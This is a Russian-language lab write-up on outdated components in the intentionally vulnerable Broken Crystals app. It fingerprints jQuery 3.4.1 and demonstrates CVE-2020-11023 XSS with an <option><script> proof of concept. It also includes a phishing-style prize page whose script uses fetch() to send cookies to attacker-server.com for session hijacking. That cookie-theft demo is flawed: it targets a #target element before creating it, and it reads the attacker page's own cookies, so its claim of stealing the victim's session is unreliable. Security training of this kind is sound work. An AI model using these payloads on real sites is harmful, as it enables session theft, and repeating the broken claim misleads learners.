# Уязвимые и устаревшие компоненты (Vulnerable and Outdated Components)

### Цель работы

Выявить использование уязвимых или устаревших версий библиотек, фреймворков и других компонентов в веб-приложении. Проанализировать возможные векторы атак, связанные с известными уязвимостями (CVE) в используемых зависимостях, и оценить потенциальный риск эксплуатации таких компонентов для компрометации приложения или данных пользователей.

## Ход выполнения

### 1) Разведка

Для выявления используемых компонентов проанализировал исходный код главной страницы приложения:

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Broken Crystals" />

    <!-- Favicons -->
    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-icon-180x180.png" />
    <link rel="icon" type="image/png" sizes="192x192" href="/favicons/android-icon-192x192.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png" />
    <meta name="theme-color" content="#ffffff" />

    <script id="config" type="application/json" src="/api/config"></script>

    <!--
      manifest.json provides metadata used when your web app is installed on a
      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
    -->
    <link rel="manifest" href="/manifest.json" />
    <title>Broken Crystals</title>
    <!-- Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Roboto:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
      rel="stylesheet"
    />

    <!-- Vendor CSS Files -->
    <link href="/assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" />
    <link href="/assets/vendor/icofont/icofont.min.css" rel="stylesheet" />
    <link href="/assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet" />
    <link href="/assets/vendor/venobox/venobox.css" rel="stylesheet" />
    <link href="/assets/vendor/aos/aos.css" rel="stylesheet" />

    <!-- Vendor CSS-->
    <link href="/vendor/wow/animate.css" rel="stylesheet" media="all" />
    <link href="/vendor/slick/slick.css" rel="stylesheet" media="all" />

    <!-- Main CSS-->
    <link href="/assets/css/style.css" rel="stylesheet" media="all" />
    <link href="/css/theme.css" rel="stylesheet" media="all" />
    <script type="module" crossorigin src="/assets/index-BgqCpeGa.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-Bm2fv7OY.css">
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>

    <!-- Vendor JS Files -->
    <script src="/assets/vendor/jquery/jquery.min.js"></script>
    <script src="/assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="/assets/vendor/jquery.easing/jquery.easing.min.js"></script>
    <script src="/assets/vendor/counterup/counterup.min.js"></script>
    <script src="/assets/vendor/venobox/venobox.min.js"></script>
    <script src="/assets/vendor/aos/aos.js"></script>

    <!-- Vendor JS       -->
    <script src="/vendor/slick/slick.min.js"></script>
    <script src="/vendor/wow/wow.min.js"></script>
    <script src="/vendor/counter-up/jquery.waypoints.min.js"></script>
    <script src="/vendor/counter-up/jquery.counterup.min.js"></script>

    <div id="root"></div>
  </body>
</html>
```

В коде страницы обнаружены ссылки на подключаемые JavaScript-библиотеки:

```html
<script src="/vendor/jquery/jquery.min.js"></script>
<script src="/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
```

Отправив запросы к серверу, выяснены версии библиотек:

- `https://brokencrystals.com/assets/vendor/jquery/jquery.min.js` - **jQuery v3.4.1**

- `https://brokencrystals.com/assets/vendor/bootstrap/js/bootstrap.bundle.min.js` - **Bootstrap v4.4.1**

### 2) Атака

Для проверки устаревших компонентов был проведен поиск известных CVE:

- **jQuery 3.4.1** подвержена уязвимости **CVE-2020-11023**

При передаче HTML-строки, содержащей элементы <option>, даже предварительно очищенный код может привести к выполнению непреднамеренного JavaScript. Уязвимость исправлена в jQuery 3.5.0. Злоумышленник может внедрить вредоносный код через пользовательский ввод, который затем обрабатывается уязвимыми методами jQuery. Успешная эксплуатация позволяет выполнить произвольный JavaScript.

### 3) Эксплуатация

Для демонстрации уязвимости был создан локальный HTML-файл, подключающий ту же версию jQuery с сайта, и содержащий тестовый код, использующий уязвимый метод `.html()` для вставки `<option>`.

```html
<!DOCTYPE html>
<html>
<head>
    <title>jQuery CVE-2020-11023 Demo</title>
    <script src="https://brokencrystals.com/assets/vendor/jquery/jquery.min.js"></script>
</head>
<body>
    <div id="target"></div>
    
    <script>
        var maliciousHtml = '<option><script>alert("XSS через jQuery " + jQuery.fn.jquery)<\/script>';
        
        $('#target').html(maliciousHtml);
    </script>
</body>
</html>
```

При открытии этой страницы в браузере jQuery обрабатывает переданную HTML-строку, и внедренный JavaScript-код выполняется, о чем свидетельствует всплывающее окно с версией jQuery:

<img width="963" height="265" alt="изображение" src="https://github.com/user-attachments/assets/0cfccc90-bcc8-4aea-b22a-2df301688caa" />


Также используя данную уязвимость можно, к примеру, похитить cookie сессии жертвы и отправить их на сервер злоумышленника:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Поздравляем! Вы выиграли приз!</title>
    <script src="https://brokencrystals.com/assets/vendor/jquery/jquery.min.js"></script>
</head>
<body>
    <h1>🎉 Вы выиграли iPhone! 🎉</h1>
    <p>Нажмите OK, чтобы получить приз...</p>
    
    <script>
        // Вредоносный payload через уязвимый jQuery
        var attackerServer = "https://attacker-server.com/steal";
        var stolenCookies = document.cookie;
        
        var maliciousHtml = '<option><script>' +
            'fetch("' + attackerServer + '?cookies=" + encodeURIComponent("' + stolenCookies + '"));' +
            '<\/script>';
        
        $('#target').html(maliciousHtml);
        
        // Дополнительно: создаем невидимый элемент для атаки
        $('body').append('<div id="target" style="display:none"></div>');
    </script>
</body>
</html>
```

При открытии страницы происходит следующее:

  1. Браузер загружает jQuery с `brokencrystals.com`
  2. Уязвимый метод `.html()` обрабатывает вредоносный `<option>`
  3. Выполняется JavaScript, который отправляет cookie текущей сессии на сервер злоумышленника
  4. Злоумышленник получает cookie и может использовать их для захвата сессии

На скриншоте видно выполнение JavaScript и отправку данных на сервер злоумышленника. Данная атака демонстрирует, что использование устаревших компонентов может привести к компрометации пользовательских данных и захвату сессий.
